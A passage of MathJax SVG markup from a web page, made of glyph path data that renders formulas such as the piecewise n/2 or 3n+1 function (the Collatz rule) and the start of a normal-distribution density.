347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1322.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2322.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(8678.4,0) translate(0 -0.5)"><path data-c="7D" d="M131 1414T131 1429T133 1447T148 1450H153H167L182 1444Q276 1404 336 1343T415 1207Q421 1184 421 1154T423 851L424 531L426 517Q434 462 460 415T518 339T571 296T608 274Q615 270 616 267T618 251Q618 241 618 238T615 232T608 227Q542 194 491 132T426 -15L424 -29L423 -350Q422 -622 422 -652T415 -706Q397 -780 337 -841T182 -943L167 -949H153Q137 -949 134 -946T131 -928Q131 -914 132 -911T144 -904Q146 -903 148 -902Q299 -820 323 -680Q324 -663 325 -349T327 -19Q355 145 541 241L561 250L541 260Q356 355 327 520Q326 537 325 850T323 1181Q315 1227 293 1267T244 1332T193 1374T151 1401T132 1413Q131 1414 131 1429Z"></path></g></g><g data-mml-node="mo" transform="translate(9706.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(10762,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(11312,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11701,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12301,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.003ex;" xmlns="http://www.w3.org/2000/svg" width="28.837ex" height="7.138ex" role="img" focusable="false" viewBox="0 -1827.5 12746 3155"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1539,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2205.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(3261.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7B" d="M661 -1243L655 -1249H622L604 -1240Q503 -1190 434 -1107T348 -909Q346 -897 346 -499L345 -98L343 -82Q335 3 287 87T157 223Q146 232 145 236Q144 240 144 250Q144 265 145 268T157 278Q242 333 288 417T343 583L345 600L346 1001Q346 1398 348 1410Q379 1622 600 1739L622 1750H655L661 1744V1727V1721Q661 1712 661 1710T657 1705T648 1700T630 1690T602 1668Q589 1659 574 1643T531 1593T484 1508T459 1398Q458 1389 458 1001Q458 614 457 605Q441 435 301 316Q254 277 202 251L250 222Q260 216 301 185Q443 66 457 -104Q458 -113 458 -501Q458 -888 459 -897Q463 -944 478 -988T509 -1060T548 -1114T580 -1149T602 -1167Q620 -1183 634 -1192T653 -1202T659 -1207T661 -1220V-1226V-1243Z"></path></g><g data-mml-node="mtable" transform="translate(806,0)"><g data-mml-node="mtr" transform="translate(0,1077.5)"><g data-mml-node="mtd"><g data-mml-node="mfrac"><g data-mml-node="mi" transform="translate(220,394) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(255.4,-345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="624.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(864.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(4100.4,0)"><g data-mml-node="mrow"><g data-mml-node="mtext"><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(278,0)"></path><path data-c="A0" d="" transform="translate(584,0)"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(834,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mtext" transform="translate(1434,0)"><path data-c="A0" d=""></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(250,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(528,0)"></path><path data-c="20" d="" transform="translate(922,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1172,0)"></path><path data-c="76" d="M338 431Q344 429 422 429Q479 429 503 431H508V385H497Q439 381 423 345Q421 341 356 172T288 -2Q283 -11 263 -11Q244 -11 239 -2Q99 359 98 364Q93 378 82 381T43 385H19V431H25L33 430Q41 430 53 430T79 430T104 429T122 428Q217 428 232 431H240V385H226Q187 384 184 370Q184 366 235 234L286 102L377 341V349Q377 363 367 372T349 383T335 385H331V431H338Z" transform="translate(1616,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(2144,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(2588,0)"></path></g></g></g></g><g data-mml-node="mtr" transform="translate(0,-1077.5)"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1322.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2322.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2822.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(4100.4,0)"><g data-mml-node="mrow"><g data-mml-node="mtext"><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(278,0)"></path><path data-c="A0" d="" transform="translate(584,0)"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(834,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mtext" transform="translate(1434,0)"><path data-c="A0" d=""></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(250,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(528,0)"></path><path data-c="20" d="" transform="translate(922,0)"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(1172,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1672,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(2228,0)"></path></g></g></g></g></g><g data-mml-node="mo" transform="translate(9484.4,0) translate(0 250)"></g></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.308ex;" xmlns="http://www.w3.org/2000/svg" width="32.075ex" height="5.801ex" role="img" focusable="false" viewBox="0 -1543.9 14177.2 2563.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2177.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3233.6,0)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(1217,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mrow" transform="translate(220,-915)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g></g><g data-mml-node="mo" transform="translate(0,95)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="1070" height="60" x="853" y="835"></rect></g><g data-mml-node="mi" transform="translate(1923,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g></g><rect width="2694" height="60" x="120" y="220"></rect></g></g><g data-mml-node="mi" transform="translate(6167.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 